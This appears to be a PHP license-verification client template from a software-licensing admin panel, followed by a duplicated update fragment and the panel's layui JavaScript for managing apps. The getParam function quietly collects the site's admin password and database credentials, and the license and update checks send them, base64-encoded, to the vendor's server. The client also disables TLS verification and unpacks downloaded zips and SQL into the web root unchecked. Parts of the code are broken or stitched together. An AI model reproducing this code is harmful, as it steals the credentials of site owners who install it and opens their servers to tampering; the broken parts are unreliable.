class Authorization{
    /**
    * 信息配置
    * @author 陌上花开
    */
    // 填写授权站域名
    const AUTH_DOMAIN = '{:DOMAIN}';
    // 填写本应用API的密钥
    const APP_API_KEY = '<span class="api_key"></span>';
    // 填写本应用ID
    const APPID = '<span class="appid"></span>';
    // 填写提交方式 get或post
    const METHOD = '<span class="method"></span>';
    // 填写授权站是否为https true为https，false为http
    const IS_HTTPS = {:is_https()? "true" : "false"};
    // 授权缓存时间(单位/秒)
    const TIME = 86400;
    // 队列查询最长等待时间
    const QUEUE_TIME = 60;
    // 缓存名称
    const SESSION_NAME = 'QH_CheckAuthResult';
    // 盗版提示
    private static function message($msg = ''){
        // 自定义盗版提示HTML代码
        $html = '&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;title&gt;站点提示信息&lt;/title&gt;&lt;style&gt;html{background:#eee}body{background:#fff;color:#333;font-family:&quot;微软雅黑&quot;,&quot;Microsoft YaHei&quot;,sans-serif;margin:2em auto;padding:1em 2em;max-width:700px;-webkit-box-shadow:10px 10px 10px rgba(0,0,0,.13);box-shadow:10px 10px 10px rgba(0,0,0,.13);opacity:.8}#error-page{margin-top:50px}h3{text-align:center}#error-page p{font-size:9px;line-height:1.5;margin:25px 0 20px}a{color:#21759B;text-decoration:none;margin-top:-10px}a:hover{color:#D54E21}&lt;/style&gt;&lt;body id=&quot;error-page&quot;&gt;&lt;h3&gt;站点提示信息&lt;/h3&gt;&#x27;.$msg.&#x27;&lt;/body&gt;&lt;/html&gt;';
        exit($html);
    }
    // 检测授权
    public static function main(){
        $QH_CheckAuthResult = self::getSession();
        if(!empty($QH_CheckAuthResult)){
            $result = $QH_CheckAuthResult;
            if(is_array($result)){
                if(self::verifySign(json_encode($result['data']['data']), $result['data']['sign'])){
                    if(($result['data']['data']['time'] + self::TIME) > time()){
                        if($result['data']['data']['code'] != 0){
                            self::deleteSession();
                            self::message($result['msg']);
                        }
                    }else{
                        self::deleteSession();
                    }
                }else{
                    self::deleteSession();
                    self::message('签名验证失败，请刷新后重试~');
                }
            }else{
                self::deleteSession();
                self::message('链接服务器失败');
            }
        }else{
            $result = self::checkInfo();
            if(!$result){
                self::message('链接服务器失败');
            }else{
                if($result['data']['data']['code'] == 0) {
                    self::setSession($result);
                }else if($result['data']['data']['code'] == 1){
                    // 此处为关闭盗版提示部分，若该应用关闭盗版提示则可在此填入自定义的代码，可留空
                }else{
                    self::message($result['msg']);
                }
            }
        }
    }
    // 在线更新
    public static function updateMain($QH_Action = 'check'){
        $result = self::checkInfo('update');
        switch ($QH_Action) {
            case 'check':
                // 如果链接服务器失败
                if(!$result){
                    $data = [
                        'code' => -1,
                        'msg' => '啊哦，更新服务器开小差了，请刷新此页面。'
                    ];
                    return $data;
                }else{
                    return $result;
                }
            case 'update':
                // 授权站下载更新包网址
                $downloadUrl = $result['data']['data']['data']['url'];
                // 下载到本地的压缩包名称
                $ZipFile = 'QH.zip';
                // 循环需要更新的版本
                foreach ($result['data']['data']['data']['download'] as $res){
                    // 模拟用户
                    ini_set('user_agent','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;)');
                    // 若下载更新包失败
                    if(!copy($downloadUrl.$res, $ZipFile)){
                        $data = [
                            'code' => -1,
                            'msg' => '无法下载更新包文件！'
                        ];
                        return $data;
                    }
                    $addstr = '';
                    // 若解压到根目录成功
                    if (self::zipExtract($ZipFile, ROOT)) {
                        if(function_exists("opcache_reset"))@opcache_reset();
                        $sqlFile = ROOT.'update.sql';
                        // 检测是否存在update.sql
                        if(is_file($sqlFile)){
                            $sql = file_get_contents($sqlFile);
                            $t=0; $e=0; $error='';
                            for($i=0;$i < count($sql);$i++) {
                                if (trim($sql[$i])=='')continue;
                                if($DB->exec($sql[$i])!==false) {
                                    ++$t;
                                } else {
                                    ++$e;
                                    $error.=$DB->error().'<br/>';
                                }
                            }
                            @unlink($sqlFile);
                            $addstr = '<br/>数据库更新成功。SQL成功'.$t.'句/失败'.$e.'句';
                        }
                        @unlink($ZipFile);
                        $data = [
                            'code' => 0,
                            'msg' => '更新包解压成功'.$addstr
                        ];
                        return $data;
                    }else {
                        if (file_exists($ZipFile))
                            @unlink($ZipFile);
                        $data = [
                            'code' => -1,
                            'msg' => '解压更新包失败，请稍后重试'
                        ];
                        return $data;
                    }
                }
                // 全部版本更新完成
                $data = [
                    'code' => 1,
                    'msg' => '已更新至最新版本'
                ];
                return $data;
            default:
                $data = [
                    'code' => -1,
                    'msg' => '请求类型错误！'
                ];
                return $data;
        }
    }
    // 盗版入库不部分，根据自己情况适当更改
    private static function getParam(){
        global $conf,$dbconfig;
        if(!class_exists('AuthInfo')){
            self::message('缺少授权信息类！');
        }
        return ['authcode'=> AuthInfo::AUTHCODE, 'version' => AuthInfo::VERSION, '用户名' => $conf['admin_user'], '密码' => $conf['admin_pwd'], 'qq' => $conf['kfqq'], '数据库用户名' => $dbconfig['user'], '数据库密码' => $dbconfig['pwd'], '数据库库名' => $dbconfig['dbname']];
    }
    private static function checkInfo($type = 'auth'){
        switch ($type) {
            case 'update':
                $method = 'checkUpdate';
                break;
            default:
                $method = 'checkAuth';
                break;
        }
        $data = ['auth_info' => getenv('HTTP_HOST'), 'appid' => self::APPID, 'api_key' => self::APP_API_KEY, 'param' => base64_encode(json_encode(self::getParam()))];
        $is_https = (!self::IS_HTTPS)?'http://':'https://';
        $result = self::curl_request($is_https.self::AUTH_DOMAIN.'/api.php/Auth/'.$method, $data ,self::METHOD ,self::IS_HTTPS);
        //exit(print_r($result));
        $result = json_decode($result, true);
        if(is_array($result)){
            if(array_key_exists('queue',$result['data'])){
                $i = 0;
                while (1){
                    $result = self::curl_request($http.self::AUTH_DOMAIN.'/api.php/Auth/queueCheck', $data ,self::METHOD ,self::IS_HTTPS);
                    $result = json_decode($result, true);
                    if(is_array($result)) {
                        if (array_key_exists('queue',$result['data'])) {
                            $i++;
                            if($i > self::QUEUE_TIME){
                                return false;
                            }
                        } else {
                            return $result;
                        }
                    } else {
                        return false;
                    }
                    sleep(1);
                }
            } else {
                return $result;
            }
        }
        return false;
    }
    // 公钥验签
    private static function verifySign($data, $sign) {
        if(!class_exists('AuthInfo')) self::message('缺少授权信息类！');
        $publicKey = AuthInfo::PUBLIC_KEY;
        if(empty($publicKey)) self::message('缺少公玥，请重新到&lt;a href=&quot;'.((!self::IS_HTTPS)?'http://':'https://').self::AUTH_DOMAIN.'&quot;&gt;授权站下载源码！');
        return (1 == openssl_verify($data, self::urlSafeBase64decode($sign), $publicKey, OPENSSL_ALGO_SHA256));
    }
    private static function urlSafeBase64decode($string){
        $data = str_replace(array('-','_'), array('+','/'), $string);
        $mod4 = strlen($data) % 4;
        if($mod4){
            $data .= substr('====', $mod4);
        }
        return base64_decode($data);
    }
    // 解压函数
    private static function zipExtract($filePath, $topath){
        if (empty($topath) || empty($filePath)) {
            return false;
        }
        $zip = new \ZipArchive();
        if ($zip->open($filePath) === true) {
            if(true){
                for($i = 0; $i < $zip->numFiles; $i++) {
                    $filename = $zip->getNameIndex($i);
                    $t = explode('.',$filename);
                    if(count($t) == 2){
                        if(is_file($topath.'/'.$filename)){
                            @unlink($topath.'/'.$filename);
                        }
                        $s = $zip->getStream($filename);
                        $data = stream_get_contents($s);
                        file_put_contents($topath.'/'.$filename, $data);
                    }else{
                        @mkdir($topath.'/'.$filename, 0777);
                    }
                }
            }
            $zip->close();
            return true;
        } else {
            return false;
        }
    }
    // 获取SESSION
    private static function getSession(){
        return !empty($_SESSION[self::SESSION_NAME])?$_SESSION[self::SESSION_NAME]:null;
    }
    // 设置SESSION
    private static function setSession($session = null){
        $_SESSION[self::SESSION_NAME] = $session;
    }
    // 删除SESSION
    private static function deleteSession(){
        unset($_SESSION[self::SESSION_NAME]);
    }
    // CURL请求
    private static function curl_request($url, $data = [], $type = 'post', $https = false){
        // 初始化
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)');
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
        // 设置超时时间
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        // 是否要求返回数据
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        if ($https) {
            // 对认证证书来源的检查
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            // 从证书中检查SSL加密算法是否存在
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        }
        if (strtolower($type) == 'post') {
            // 设置post方式提交
            curl_setopt($ch, CURLOPT_POST, true);
            // 提交的数据
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        } elseif (!empty($data) && is_array($data)) {
            // get网络请求
            $url = $url . '?' . http_build_query($data);
        }
        // 设置抓取的url
        curl_setopt($ch, CURLOPT_URL, $url);
        // 执行命令
        $result = curl_exec($ch);
        if ($result === false) {
            return false;
        }
        // 关闭URL请求(释放句柄)
        curl_close($ch);
        return $result;
    }
}</pre>

            case 'check':
                // 如果链接服务器失败
                if(!$result){
                    $data = [
                        'code' => -1,
                        'msg' => '啊哦，更新服务器开小差了，请刷新此页面。'
                    ];
                    return $data;
                }else{
                    return $result;
                }
            case 'update':
                // 授权站下载更新包网址
                $downloadUrl = $result['data']['data']['url'];
                // 下载到本地的压缩包名称
                $ZipFile = 'QH.zip';
                // 循环需要更新的版本
                foreach ($result['data']['data']['download'] as $res){
                    // 模拟用户
                    ini_set('user_agent','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;)');
                    // 若下载更新包失败
                    if(!copy($downloadUrl.$res, $ZipFile)){
                        $data = [
                            'code' => -1,
                            'msg' => '无法下载更新包文件！'
                        ];
                        return $data;
                    }
                    $addstr = '';
                    // 若解压到根目录成功
                    if (zipExtract($ZipFile, ROOT)) {
                        if(function_exists("opcache_reset"))@opcache_reset();
                        $sqlFile = ROOT.'update.sql';
                        // 检测是否存在update.sql
                        if(is_file($sqlFile)){
                            $sql = file_get_contents($sqlFile);
                            $t=0; $e=0; $error='';
                            for($i=0;$i < count($sql);$i++) {
                                if (trim($sql[$i])=='')continue;
                                if($DB->exec($sql[$i])!==false) {
                                    ++$t;
                                } else {
                                    ++$e;
                                    $error.=$DB->error().'<br/>';
                                }
                            }
                            @unlink($sqlFile);
                            $addstr = '<br/>数据库更新成功。SQL成功'.$t.'句/失败'.$e.'句';
                        }
                        @unlink($ZipFile);
                        $data = [
                            'code' => 0,
                            'msg' => '更新包解压成功'.$addstr
                        ];
                        return $data;
                    }else {
                        if (file_exists($ZipFile))
                            @unlink($ZipFile);
                        $data = [
                            'code' => -1,
                            'msg' => '解压更新包失败，请稍后重试'
                        ];
                        return $data;
                    }
                }
                // 全部版本更新完成
                $data = [
                    'code' => 1,
                    'msg' => '已更新至最新版本'
                ];
                return $data;
            default:
                $data = [
                    'code' => -1,
                    'msg' => '请求类型错误！'
                ];
                return $data;
        }
    }
}

<script type="text/javascript" src="{__MODULE__}clipboard.js"></script>
<script>
    layui.use(['layer', 'element', 'form', 'table', 'admin', 'notice', 'laydate', 'upload', 'code', 'layedit'], function () {
        var $ = layui.jquery;
        var layer = layui.layer;
        var form = layui.form;
        var table = layui.table;
        var admin = layui.admin;
        var notice = layui.notice;
        var laydate = layui.laydate;
        var element = layui.element;
        var upload = layui.upload;
        var layedit = layui.layedit;

        /* 渲染表格 */
        var insTb = table.render({
            elem: '#QH_Table',
            url: '{:url("/App/list")}',
            method: 'post',
            page: true,
            skin: 'line',
            size: 'lg',
            toolbar: ['<p>',
                '<button lay-event="edit" class="layui-btn layui-btn-sm icon-btn"><i class="layui-icon">&#xe654;</i>'+window.t('common.add')+'</button>&nbsp;',
                '<button lay-event="del" class="layui-btn layui-btn-sm layui-btn-danger icon-btn"><i class="layui-icon">&#xe640;</i>'+window.t('common.delete')+'</button>',
                '</p>'].join(''),
            cellMinWidth: 100,
            request: {
                pageName: 'current_page' //页码的参数名称，默认：page
                ,limitName: 'limit' //每页数据量的参数名，默认：limit
            },
            parseData: function(res){ //res 即为原始返回的数据
                return {
                    "code": res.code, //解析接口状态
                    "msg": res.msg, //解析提示文本
                    "count": res.data.data.total, //解析数据长度
                    "data": res.data.data.data //解析数据列表
                };
            },
            cols: [[
                {type: 'checkbox', fixed: true},
                {field: 'id', title: 'ID', sort: true, width: 80, fixed: true, templet: function (d) {
                        if (d.status == 2) {
                            return '<span class="layui-badge-dot layui-bg-qh-indigo" style="height: 6px;width: 6px;position: relative;top: -2px"></span> '+d.id;
                        } else if (d.status == 1) {
                            return '<span class="layui-badge-dot layui-bg-qh-orange" style="height: 6px;width: 6px;position: relative;top: -2px"></span> '+d.id;
                        } else {
                            return '<span class="layui-badge-dot layui-bg-qh-red" style="height: 6px;width: 6px;position: relative;top: -2px"></span> '+d.id;
                        }
                    }
                },
                {field: 'logo', title: 'LOGO', templet: function (d) {
                        var url = d.logo || '/Assets/img/logo.png';
                        return '<img data-index="' + (d.LAY_INDEX - 1) + '" src="' + url + '" class="tb-img-circle" tb-img alt=""/>';
                    }, width: 100, unresize: true},
                {field: 'name', title: window.t('app_ui.app_name'), sort: true, minWidth: 120},
                {field: 'checkTypeName', title: window.t('app_ui.judge_rule'), sort: true, minWidth: 130, templet: function (d) {
                        return '<span class="layui-badge layui-badge-green">'+d.checkTypeName+'</span>';
                    },
                },
                {field: 'introduce', title: window.t('app_ui.app_desc'), minWidth: 100, templet: function (d) {
                        return '<a class="layui-btn layui-btn-xs" lay-event="seeIntroduce">'+window.t('version_ui.click_view')+'</a>';
                    }
                },
                {field: 'addtime', title: window.t('common.add_time'), sort: true, minWidth: 170},
                {field: 'status', title: window.t('app_ui.operating_status'), sort: true, templet: '#QH_TbState', minWidth: 110},
                {field: 'status', title: window.t('app_ui.stop_status'), sort: true, templet: '#QH_TbState2', minWidth: 110},
                {title: window.t('common.operation'), toolbar: '#QH_TbBar', align: 'center', minWidth: 270}
            ]]
        });
        $(document).off('click.tbImg').on('click.tbImg', '[tb-img]', function () {
            var imgList = table.cache['QH_Table'].map(function (d) {
                return {
                    alt: d.username,
                    src: d.logo || '/Assets/img/logo.png'
                }
            });
            layer.photos({photos: {data: imgList, start: $(this).data('index')}, shade: .1, closeBtn: true});
        });
        form.on('select(type)', function (data) {
            if (data.value == "diy") {
                $("#diy").css("display", "inherit");
            }else{
                $("#diy").css("display", "none");
            }
        });
        form.on('switch(permanent_switch)', function (data) {
            if (data.elem.checked) {
                $("#type").css("display", "none");
            }else{
                $("#type").css("display", "inherit");
            }
        });

        /* 表格搜索 */
        form.on('submit(QH_TbSearch)', function (data) {
            insTb.reload({where: data.field, page: {curr: 1}});
            return false;
        });

        {if $id != ''}
        insTb.reload({where: {id:{$id}}, page: {curr: 1}, cols: [[{type: 'checkbox', fixed: true},{field: 'id', title: 'ID', templet: '#QH_Tbid', sort: true, width: 80, fixed: true}]]});
        {/if}
            /* 表格工具条点击事件 */
            table.on('tool(QH_Table)', function (obj) {
                if (obj.event === 'edit') { // 修改
                    showEditModel(obj.data);
                } else if (obj.event === 'del') { // 删除
                    doDel(obj);
                } else if (obj.event === 'seeIntroduce') {
                    admin.open({
                        title: window.t('app_ui.view_description_title', {name: obj.data.name}),
                        type: 1,
                        content: '<div class="layui-card"><div class="layui-card-body"><div class="layui-form layui-form-pane"><div class="layui-form-item layui-form-text"><label class="layui-form-label">'+window.t('app_ui.app_desc')+'</label><div class="layui-input-block"><textarea name="introduce" class="layui-textarea layui-disabled" style="height:100px" placeholder="'+window.t('app_ui.app_desc_placeholder')+'" disabled>'+(obj.data.introduce?obj.data.introduce:window.t('app_ui.no_description'))+'</textarea></div></div></div></div></div>'
                    });
                }else if (obj.event === 'code') {
                    admin.open({
                        id: 'authCode',
                        title: window.t('app_ui.view_auth_code_title', {name: obj.data.name}),
                        type: 1,
                        area:['600px','700px'],
                        content:$("#QH_CodeDialog").html(),
                        success: function (layero, dIndex) {
                            $(".public_key").text(obj.data.public_key);
                            if(obj.data.public_key == '' || obj.data.private_key == ''){
                                admin.closeDialog('#authCode');
                                parent.layui.notice.msg(window.t('app_ui.config_key_first'), {icon:2,audio:'1'});
                            }
                            $(".api_key").text(obj.data.api_key??'');
                            $(".appid").text(obj.data.id);
                            $(".method").text(obj.data.check_auth_method?'post':'get');
                            let js_public_key = '';
                            $.each(obj.data.public_key.split("\n"),function(index, value){
                                js_public_key += '\''+value+'\'\+\n';
                            });

                            $(".js_public_key").text(js_public_key.slice(0,js_public_key.length-2));
                            layui.code({
                                title: window.t('app_ui.qh_auth_system'),
                                skin: 'notepad',
                                about:false
                            });
                        }
                    });
                }
                laydate.render({
                    elem: '#test', //指定元素
                    mark: {
                        '0-3-15': 'QH'
                    },
                    type: 'datetime',
                    trigger: 'click'
                });
            });
            var clipboard = new ClipboardJS('.btnCopy');
            clipboard.on('success', function(e) {
                e.clearSelection();
                notice.msg(window.t('app_ui.copy_success'), {icon:1, audio:'1'});
            });

            clipboard.on('error', function(e) {
                console.error('Action:', e.action);
                notice.msg(window.t('app_ui.copy_failed'), {icon:2, audio:'1'});
            });

            /* 表格头工具栏点击事件 */
            table.on('toolbar(QH_Table)', function (obj) {
                if (obj.event === 'edit') { // 添加
                    showEditModel();
                } else if (obj.event === 'del') { // 删除
                    var checkRows = table.checkStatus('QH_Table');
                    if (checkRows.data.length === 0) {
                        notice.msg(window.t('confirm.please_select_data'), {icon: 3, audio:'1'});
                        return;
                    }
                    var ids = checkRows.data.map(function (d) {
                        return d.id;
                    });
                    doDel({ids: ids});
                }
                laydate.render({
                    elem: '#test', //指定元素
                    mark: {
                        '0-3-15': 'QH'
                    },
                    type: 'datetime',
                    trigger: 'click'
                });
            });

            /* 显示表单弹窗 */
            function showEditModel(mData) {
                admin.open({
                    type: 1,
                    title: window.t('app_ui.dialog_title', {action: window.t(mData ? 'common.edit' : 'common.add')}),
                    maxmin: true,
                    resize: true,
                    btn: [window.t('common.save'), window.t('common.cancel')],
                    area: ['640px', '520px'],
                    shade: 0,
                    fixed: true,
                    offset: 'auto',
                    content: $('#QH_EditDialog').html(),
                    success: function (layero, dIndex) {
                        var richEditors = [];
                        function initRichEditors() {
                            if (richEditors.length) {
                                return;
                            }
                            $(layero).find('.qh-rich-editor').each(function () {
                                richEditors.push(layedit.build($(this).attr('id'), {
                                    height: 220,
                                    tool: ['strong', 'italic', 'underline', 'del', '|', 'left', 'center', 'right', '|', 'link', 'unlink', 'face']
                                }));
                            });
                        }
                        function syncRichEditors() {
                            $.each(richEditors, function (_, index) {
                                layedit.sync(index);
                            });
                        }
                        // 回显表单数据
                        element.render();
                        if(mData){
                            $("input[name='logo']").val(mData.logo);
                            layui.$('#uploadDemoView').removeClass('layui-hide').find('img').attr('src', mData.logo);
                        }
                        notice.msg(window.t('common.loading_text'), {icon: 4, close: true});
                        $.ajax({
                            type: "POST",
                            url: '{:url("/AuthTemplate/getList")}',
                            dataType: "json",
                            success: function(data) {
                                notice.destroy();
                                if (data.code == 0) {
                                    notice.msg(window.t('common.list_success'), {icon: 1, audio:'1'});
                                    var content = '<option value="">'+window.t('app_ui.select_template')+'</option>';
                                    $.each(data.data,function(index, value){
                                        $.each(value,function(index, value){
                                            content += '<option value="'+value.id+'">'+value.name+'</option>';
                                        });
                                    });
                                    $("#auth_template").html(content);
                                    if(mData) {
                                        form.val('formBasForm', mData);
                                    }
                                } else {
                                    notice.msg(data.msg, {icon: 2, audio:'1'});
                                }
                                form.render();
                            },
                            error: function() {
                                notice.destroy();
                                notice.msg(window.t('common.server_error'), {icon: 2, audio:'1'});
                            }
                        });

                        notice.msg(window.t('common.loading_text'), {icon: 4, close: true});
                        $.ajax({
                            type: "POST",
                            url: '{:url("/PowerTemplate/getList")}',
                            dataType: "json",
                            success: function(data) {
                                notice.destroy();
                                if (data.code == 0) {
                                    notice.msg(window.t('common.list_success'), {icon: 1, audio:'1'});
                                    var content = '<option value="">'+window.t('app_ui.select_template')+'</option>';
                                    $.each(data.data,function(index, value){
                                        $.each(value,function(index, value){
                                            content += '<option value="'+value.id+'">'+value.name+'</option>';
                                        });
                                    });
                                    $("#power_template").html(content);
                                    if(mData) {
                                        form.val('formBasForm', mData);
                                    }
                                } else {
                                    notice.msg(data.msg, {icon: 2, audio:'1'});
                                }
                                form.render();
                            },
                            error: function() {
                                notice.destroy();
                                notice.msg(window.t('common.server_error'), {icon: 2, audio:'1'});
                            }
                        });

                        var uploadInst = upload.render({
                            elem: '#upload'
                            ,url: '{:url("/Upload/image")}'
                            ,before: function(obj){
                                //预读本地文件示例，不支持ie8
                                obj.preview(function(index, file, result){
                                    $('#demo1').attr('src', result); //图片链接（base64）
                                });
                                notice.msg(window.t('app_ui.uploading'), {icon: 4, close: true});
                            }
                            ,done: function(res){
                                notice.destroy();
                                //如果上传失败
                                if(res.code == 0){
                                    $("input[name='logo']").val(res.data.path);
                                    layui.$('#uploadDemoView').removeClass('layui-hide').find('img').attr('src', res.files.file);
                                    notice.msg(window.t('upload.upload_success'), {icon: 1, audio:'1'});
                                }else{
                                    notice.msg(window.t('common.upload_failed'), {icon: 2, audio:'1'});
                                }
                            }
                        });
                        function installerSize(bytes) {
                            bytes = parseInt(bytes || 0, 10);
                            if (bytes <= 0) return '-';
                            return bytes >= 1048576 ? (bytes / 1048576).toFixed(2) + ' MB' : (bytes / 1024).toFixed(2) + ' KB';
                        }
                        function showInstallerMeta(meta) {
                            meta = meta || {};
                            $(layero).find('#qhInstallerName').text(meta.file_name || meta.installer_file_name || window.t('app_ui.not_uploaded'));
                            $(layero).find('#qhInstallerSize').text(installerSize(meta.size || meta.installer_size));
                            var hash = meta.sha256 || meta.installer_sha256 || '';
                            $(layero).find('#qhInstallerHash').text(hash ? hash.substr(0, 20) + '…' : '-').attr('title', hash);
                            $(layero).find('#qhInstallerTime').text(meta.uploaded_at || meta.installer_uploaded_at || '-');
                        }
                        showInstallerMeta(mData || {});
                        var installerButton = $(layero).find('#qhInstallerUpload');
                        if (!mData || !mData.id) {
                            installerButton.addClass('layui-btn-disabled').prop('disabled', true);
                            $(layero).find('#qhInstallerHint').text(window.t('app_ui.save_before_installer'));
                        } else {
                            upload.render({
                                elem: installerButton[0],
                                url: '{:url("/App/uploadInstaller")}',
                                data: {id: mData.id},
                                accept: 'file',
                                exts: 'zip',
                                acceptMime: '.zip,application/zip',
                                size: 419922,
                                before: function () {
                                    installerButton.addClass('layui-btn-disabled').prop('disabled', true);
                                    notice.msg(window.t('app_ui.installer_uploading'), {icon: 4, close: true});
                                },
                                done: function (res) {
                                    notice.destroy();
                                    installerButton.removeClass('layui-btn-disabled').prop('disabled', false);
                                    if (res.code == 0) {
                                        showInstallerMeta(res.data || {});
                                        if (res.data) $.extend(mData, {
                                            installer_file_name: res.data.file_name,
                                            installer_sha256: res.data.sha256,
                                            installer_size: res.data.size,
                                            installer_uploaded_at: res.data.uploaded_at
                                        });
                                        notice.msg(res.msg || window.t('app_ui.installer_upload_success'), {icon: 1, audio:'1'});
                                    } else {
                                        notice.msg(res.msg || window.t('app_ui.installer_upload_failed'), {icon: 2, audio:'1'});
                                    }
                                },
                                error: function () {
                                    notice.destroy();
                                    installerButton.removeClass('layui-btn-disabled').prop('disabled', false);
                                    notice.msg(window.t('app_ui.upload_request_failed'), {icon: 2, audio:'1'});
                                }
                            });
                        }
                        if(mData){
                            form.val('formBasForm', mData);
                            form.render();
                        }
                        initRichEditors();
                        admin.modelForm(layero, 'submitBtn', 'formBasForm');
                        form.on('submit(submitBtn)', function (data) {
                            syncRichEditors();
                            data.field = {};
                            $.each($(layero).find('#formBasForm').serializeArray(), function (_, item) {
                                data.field[item.name] = item.value;
                            });
                            if (data.field.name == "") {
                                notice.msg(window.t('app_ui.enter_app_name'), {icon: 3, audio:'1'});
                                return false;
                            }
                            if (data.field.public_key == "") {
                                notice.msg(window.t('app_ui.enter_public_key'), {icon: 3, audio:'1'});
                                return false;
                            }
                            if (data.field.private_key == "") {
                                notice.msg(window.t('app_ui.enter_private_key'), {icon: 3, audio:'1'});
                                return false;
                            }
                            if (data.field.pirate_msg == "") {
                                notice.msg(window.t('app_ui.enter_pirate_tip'), {icon: 3, audio:'1'});
                                return false;
                            }
                            if (data.field.endtime_msg == "") {
                                notice.msg(window.t('app_ui.enter_auth_expire_tip'), {icon: 3, audio:'1'});
                                return false;
                            }
                            if (data.field.status_msg == "") {
                                notice.msg(window.t('app_ui.enter_auth_block_tip'), {icon: 3, audio:'1'});
                                return false;
                            }
                            if (data.field.authcode_msg=="") {
                                notice.msg(window.t('app_ui.enter_auth_code_tip'), {icon: 3, audio:'1'});
                                return false;
                            }
                            notice.msg(window.t('common.loading'), {icon: 4, close: true});
                            $.ajax({
                                type: "POST",
                                url: "{:url('/App/edit')}",
                                data: data.field,
                                dataType: "json",
                                success: function(data) {
                                    notice.destroy();
                                    if (data.code == 0) {
                                        notice.msg(data.msg, {icon: 1, audio:'1'});
                                    } else {
                                        notice.msg(data.msg, {icon: 2, audio:'1'});
                                    }
                                }
                            });
                            return false;
                        });
                        form.on('switch(register_switch)', function (data) {
                            if (data.elem.checked) {
                                $("#register_blacklist").css("display","inherit");
                            }else{
                                $("#register_blacklist").css("display","none");
                            }
                        });
                        // 禁止弹窗出现滚动条
                        // $(layero).children('.layui-layer-content').css('overflow', 'visible');
                    },
                    end: function (){
                        insTb.reload();
                    }
                });
            }

            /* 删除 */
            function doDel(obj) {
                layer.confirm(window.t('confirm.delete_selected'), {
                    skin: 'layui-layer-admin',
                    icon: 3,
                    shade: .1
                }, function (i) {
                    layer.close(i);
                    notice.msg(window.t('common.loading'), {icon: 4, close: true});
                    $.ajax({
                        type: "POST",
                        url: obj.data ? '{:url("/App/drop")}' : '{:url("/App/batchDrop")}',
                        data: {id: obj.data ? obj.data.id : obj.ids.join(',')},
                        dataType: "json",
                        success: function(data) {
                            notice.destroy();
                            if (data.code == 0) {
                                insTb.reload({page: {curr: 1}});
                                notice.msg(data.msg, {icon: 1, audio:'1'});
                            }else{
                                notice.msg(data.msg, {icon: 2, audio:'1'});
                            }
                        },
                        error: function() {
                            notice.destroy();
                            notice.msg(window.t('common.server_error'), {icon: 2, audio:'1'});
                        }
                    });
                });
            }

            /* 修改用户状态 */
            form.on('switch(QH_TbStateCk)', function (obj) {
                notice.msg(window.t('common.loading'), {icon: 4, close: true});
                $.ajax({
                    type: "POST",
                    url:'{:url("/App/setStatus")}',
                    data: {id:obj.value,status:obj.elem.checked ? 2 : 1},
                    dataType: "json",
                    success: function(data) {
                        notice.destroy();
                        if (data.code == 0) {
                            insTb.reload();
                            notice.msg(data.msg, {icon: 1, audio:'1'});
                        }else{
                            notice.msg(data.msg, {icon: 2, audio:'1'});
                        }
                    },
                    error: function() {
                        notice.destroy();
                        notice.msg(window.t('common.server_error'), {icon: 2, audio:'1'});
                    }
                });
            });
            form.on('switch(QH_TbStateCk2)', function (obj) {
                notice.msg(window.t('common.loading'), {icon: 4, close: true});
                $.ajax({
                    type: "POST",
                    url:'{:url("/App/setStatus")}',
                    data: {id:obj.value,status:obj.elem.checked ? 0 : 2},
                    dataType: "json",
                    success: function(data) {
                        notice.destroy();
                        if (data.code == 0) {
                            insTb.reload();
                            notice.msg(data.msg, {icon: 1, audio:'1'});
                        }else{
                            notice.msg(data.msg, {icon: 2, audio:'1'});
                        }
                    },
                    error: function() {
                        notice.destroy();
                        notice.msg(window.t('common.server_error'), {icon: 2, audio:'1'});
                    }
                });
            });
        });
</script>
